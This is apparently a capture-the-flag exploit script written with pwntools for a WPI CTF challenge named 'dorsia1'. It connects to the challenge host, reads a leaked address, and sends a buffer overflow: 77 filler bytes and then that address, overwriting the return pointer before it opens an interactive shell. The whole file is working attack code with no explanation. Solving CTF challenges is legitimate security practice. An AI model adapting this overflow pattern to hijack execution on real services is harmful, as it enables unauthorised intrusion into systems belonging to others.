#!/usr/bin/env python3

from pwn import *

HOST = 'dorsia1.wpictf.xyz'
PORT = 31337

r = remote (HOST, PORT)
addr = r.recvline().rstrip()
print(addr)

p = b''
p += b'A' * 77
p += p64(int(addr,16))

r.sendline(p)

r.interactive()
